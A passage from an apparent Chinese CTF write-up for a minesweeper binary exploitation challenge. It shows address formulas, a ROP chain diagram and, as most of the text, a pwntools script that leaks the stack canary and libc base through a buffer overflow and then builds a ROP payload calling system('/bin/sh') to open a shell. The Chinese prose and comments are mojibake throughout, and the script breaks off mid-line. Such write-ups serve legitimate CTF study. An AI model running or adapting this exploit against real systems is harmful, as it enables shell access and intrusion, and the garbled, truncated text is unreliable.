style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p>
<ol start="2">
<li><strong>è®¡ç®— Libc ä¸­ <code>/bin/sh</code> å­—ç¬¦ä¸²çš„è¿è¡Œæ—¶åœ°å€ï¼š</strong></li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>s</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>B</mi><mi>I</mi><mi>N</mi><mi>S</mi><mi>H</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">binsh\_addr=libc\_base\_addr+BINSH\_OFFSET
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p>
<ol start="3">
<li><strong>è®¡ç®— Libc ä¸­ <code>system</code> å‡½æ•°çš„è¿è¡Œæ—¶åœ°å€ï¼š</strong></li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>S</mi><mi>Y</mi><mi>S</mi><mi>T</mi><mi>E</mi><mi>M</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">system\_addr=libc\_base\_addr+SYSTEM\_OFFSET
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p>
<p>ç»ˆäºçš„ç»ˆäºï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¼˜é›…ä¸”é‚ªæ¶ã®ROPé“¾äº†ï¼š</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ˆç”±ä¸Šå¾€ä¸‹åœ°å€å‡å°</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|     <span class="selector-tag">__libc_system</span> <span class="selector-tag">addr</span>     | â† è°ƒç”¨ <span class="selector-tag">system</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">ret</span> <span class="selector-tag">addr</span> (<span class="number">8</span>bytes)    | â† åœ°å€ä»¥<span class="number">0</span><span class="selector-tag">x10</span>å¯¹é½</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|   &quot;/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span>&quot; <span class="selector-tag">string</span> <span class="selector-tag">addr</span>    | â† å‚æ•°</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| <span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> ; <span class="selector-tag">ret</span>  <span class="selector-tag">Gadget</span> <span class="selector-tag">addr</span> | â† æ§åˆ¶ <span class="selector-tag">rdi</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">old</span> <span class="selector-tag">rbp</span> <span class="selector-tag">value</span>        | </span><br><span class="line">+<span class="selector-tag">----------------------------</span>+ â† <span class="selector-tag">rbp</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª ROP é“¾çš„é•¿åº¦éœ€è¦æ»¡è¶³ <code>strlen(buf) &lt;= 16</code> çš„æ¡ä»¶ï¼Œä»¥ä¾¿é€€å‡º <code>vuln</code> å¾ªç¯ã€‚è¿™é‡Œéœ€è¦<strong>æ³¨æ„æ ˆå¯¹é½</strong>ï¼Œ system() å‡½æ•°ä¸­å­˜åœ¨è¿™æ ·çš„æŒ‡ä»¤ï¼Œå®ƒè¦æ±‚æ ˆæŒ‰ç…§ <code>0x10</code> å¯¹é½ï¼Œåœ¨ ROP é“¾ä¸­å¢åŠ â¼€æ¡ ret æŒ‡ä»¤çš„ Gadgetï¼Œå°† rsp ç§»åŠ¨ 0x8 å®Œæˆå¯¹â»¬ã€‚</p>
<p>æœ€åï¼Œä¸€é”®å‘é€ï¼<img src="/2025/04/28/SYSU%20W4terCTF%202025/wmc2.png" alt="wmc2.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = &lt;port&gt;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># vuln å‡½æ•°ä¸­ buf åˆ°è¿”å›åœ°å€çš„åç§»é‡</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">CANARY_OFFSET_FROM_BUF = <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1d19: b8 00 00 00 00 Â  Â  Â  Â  Â mov Â  Â $0x0,%eax</span></span><br><span class="line">RELATVE_RET_ADDR = <span class="number">0x1d19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 29d90: Â  Â 89 c7 Â  Â  Â mov Â  Â %eax,%edi</span></span><br><span class="line">LIBC_OFFSET = <span class="number">0x29d90</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ä¸­ Gadget çš„åç§»é‡</span></span><br><span class="line">POP_RDI_OFFSET = <span class="number">0x2a3e5</span> Â  Â  Â  Â  <span class="comment"># pop rdi; ret</span></span><br><span class="line">SYSTEM_OFFSET Â = <span class="number">0x50d74</span> Â  Â  Â  Â  <span class="comment"># system func</span></span><br><span class="line">BIN_SH_OFFSET Â = <span class="number">0x1d8678</span> Â  Â  Â  Â <span class="comment"># &quot;/bin/sh&quot; string</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">canary_value_bytes = <span class="string">b&#x27;&#x27;</span> Â  Â <span class="comment"># Canary values</span></span><br><span class="line">program_base_addr Â = <span class="number">0</span> Â  Â  Â <span class="comment"># Base address of running program</span></span><br><span class="line">libc_base_addr Â  Â  = <span class="number">0</span> Â  Â  Â <span class="comment"># Base address of libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_minesweeper</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;[*] å¼€å§‹è§£å†³æ‰«é›·æ¸¸æˆ...&quot;</span>)</span><br><span class="line">	<span class="comment"># .......</span></span><br><span class="line">Â  Â  <span class="comment"># ç­‰å¾…èƒœåˆ©æç¤ºç¬¦</span></span><br><span class="line">Â  Â  r.recvuntil(<span class="string">b&quot;You win! Please sign your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="keyword">global</span> canary_value_bytes</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;è¿›å…¥canaryè·å–é˜¶æ®µ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  leak_padding_size = CANARY_OFFSET_FROM_BUF </span><br><span class="line">Â  Â  leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€æ³„éœ² payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">Â  Â  r.sendline(leak_payload)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;æ³„éœ² payload å·²å‘é€ã€‚ç­‰å¾… Leaderboard...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;æ¥æ”¶è¾“å‡ºä»¥æ³„éœ²é‡‘ä¸é›€...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">&quot;æ¥æ”¶åˆ° Leaderboard æ ‡è®°ã€‚å‡†å¤‡æ¥æ”¶æ³„éœ²è¡Œ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  padding_line = r.recvline() </span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">f&quot;æ¥æ”¶åˆ°å¡«å……è¡Œ: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line">  </span><br><span class="line">Â  Â  Â  Â  canary_line = r.recvline()</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„é‡‘ä¸é›€è¡Œ: <span class="subst">&#123;canary_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  canary_7_bytes = canary_line[:<span class="number">7</span>]</span><br><span class="line">Â  Â  Â  Â  canary_value_bytes = <span class="string">b&#x27;\x00&#x27;</span> + canary_7_bytes</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;æˆåŠŸæå–é‡‘ä¸é›€ï¼ˆé‡æ„å‰ 7 å­—èŠ‚ï¼‰: <span class="subst">&#123;canary_7_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„é‡‘ä¸é›€: <span class="subst">&#123;canary_value_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">len</span>(canary_value_bytes) != <span class="number">8</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.warning(<span class="string">f&quot;é‡æ„åçš„é‡‘ä¸é›€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(canary_value_bytes)&#125;</span>)ï¼Œå¯èƒ½æå–é”™è¯¯æˆ–é‡‘ä¸é›€ç»“æ„ä¸åŒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.info(<span class="string">f&quot;é‡‘ä¸é›€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;canary_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;è¿æ¥åœ¨æ³„éœ²é˜¶æ®µå…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;å¯èƒ½æ³„éœ² payload å¯¼è‡´ç¨‹åºç«‹å³å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">f&quot;è§£æè¾“å‡ºæ—¶å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_base</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="keyword">global</span> libc_base_addr</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;å°è¯•æ£€æµ‹ libc å‡½æ•°åœ°å€...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># 32 + 7 * 8 - 1 + 1 = 88 å­—èŠ‚æ—¶ï¼Œå¾—åˆ°äº†ä¸€ä¸ª0x7ffe39968512?</span></span><br><span class="line">Â  Â  leak_padding_size = <span class="number">8</span> * <span class="number">13</span> -<span class="number">1</span></span><br><span class="line">Â  Â  leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€æ³„éœ² payload (é•¿åº¦åŒ…æ‹¬æ¢è¡Œç¬¦): <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)+<span class="number">1</span>&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># å‘é€æ³„éœ² payload</span></span><br><span class="line">Â  Â  r.sendline(leak_payload)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;æ³„éœ² payload å·²å‘é€ã€‚ç­‰å¾… Leaderboard...&quot;</span>)</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;æ¥æ”¶è¾“å‡ºä»¥æ³„éœ² libc base address...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">&quot;æ¥æ”¶åˆ° Leaderboard æ ‡è®°ã€‚å‡†å¤‡æ¥æ”¶æ³„éœ²è¡Œ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  padding_line = r.recvline()</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">f&quot;æ¥æ”¶åˆ°å¡«å……è¡Œ: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  libc_line = r.recvline()</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„ libc è¡Œ: <span class="subst">&#123;libc_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  end_index = libc_line.index(<span class="number">0x20</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> end_index == <span class="number">0</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  log.error(<span class="string">&quot;libc è¡Œä¸ºç©ºï¼æ²¡èƒ½è¯»åˆ°ç›¸å…³ä¿¡æ¯&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  libc_partial_bytes = libc_line[:end_index]</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  libc_bias = libc_partial_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># æ ¹æ®åç§»é‡è®¡ç®—ç¨‹åºè¿è¡Œçš„åŸºåœ°å€</span></span><br><span class="line">Â  Â  Â  Â  libc_base_addr = <span class="built_in">int</span>.from_bytes(libc_bias, byteorder=<span class="string">&#x27;little&#x27;</span>) - LIBC_OFFSET</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;æˆåŠŸæå–åˆ°éƒ¨åˆ†çš„ libc åœ°å€ä¸º: <span class="subst">&#123;libc_partial_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„ libc åœ°å€: <span class="subst">&#123;libc_bias&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;è®¡ç®—å¾—åˆ° libc è¿è¡ŒåŸºåœ°å€: <span class="subst">&#123;libc_base_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">len</span>(libc_bias) != <span class="number">8</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.warning(<span class="string">f&quot;é‡æ„åçš„ libc åœ°å€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(libc_bias)&#125;</span>)ï¼&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.info(<span class="string">f&quot;è¿”å›åœ°å€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;libc_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;è¿æ¥åœ¨æ³„éœ²é˜¶æ®µå…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;å¯èƒ½æ³„éœ² payload å¯¼è‡´ç¨‹åºç«‹å³å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">f&quot;è§£æè¾“å‡ºæ—¶å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rop_attack</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="keyword">global</span> canary_value_bytes</span><br><span class="line">Â  Â  <span class="keyword">global</span> program_base_addr</span><br><span class="line">Â  Â  <span class="keyword">global</span> libc_base_addr</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;å‡†å¤‡æ„é€  ROP payload...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  pop_rdi_ret = libc_base_addr + POP_RDI_OFFSET</span><br><span class="line">Â  Â  system_addr = libc_base_addr + SYSTEM_OFFSET</span><br><span class="line">Â  Â  binsh_addr Â = libc_base_addr + BIN_SH_OFFSET</span><br><span class="line"></span><br><span class="line">Â  Â  log.success(<span class="string">f&quot;pop rdi ; ret gadget addr: <span class="subst">&#123;pop_rdi_ret:#x&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  log.success(<span class="string">f&quot;system() addr: <span class="subst">&#123;system_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  log.success(<span class="string">f&quot;&#x27;/bin/sh&#x27; addr: <span class="subst">&#123;binsh_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># æ„é€ æœ€ç»ˆä¹‹æ— æ•Œä¼˜é›…é‚ªæ¶ã®ROP payload</span></span><br><span class="line">Â  Â  padding Â = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment"># 8å­—èŠ‚buf + 8å­—èŠ‚æ— ç”¨ç©ºé—´</span></span><br><span class="line">Â  Â  payload Â = padding</span><br><span class="line">Â  Â  payload += canary_value_bytes Â  Â  Â  Â  Â  Â <span class="comment"># 8å­—èŠ‚ canary</span></span><br><span class="line">Â  Â  payload += <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="comment"># old rbp</span></span><br><span class="line">Â  Â  payload += p64(pop_rdi_ret) Â  Â  Â  Â  Â  Â  Â <span class="comment"># gadget: pop rdi ; ret</span></span><br><span class="line">Â  Â  payload += p64(binsh_addr) Â  Â  Â  Â  Â  Â  Â  <span class="comment"># å‚æ•°ï¼šæŒ‡å‘ &quot;/bin/sh&quot;</span></span><br><span class="line">Â  Â  payload += p64(pop_rdi_ret+<span class="number">1</span>) Â  Â  Â  Â  Â  Â <span class="comment"># retï¼šä½¿æ ˆæŒ‰ç…§ 0x10 å¯¹â»¬</span></span><br><span class="line">Â  Â  payload += p64(system_addr) Â  Â  Â  Â  Â  Â  Â <span class="comment"># è°ƒç”¨ 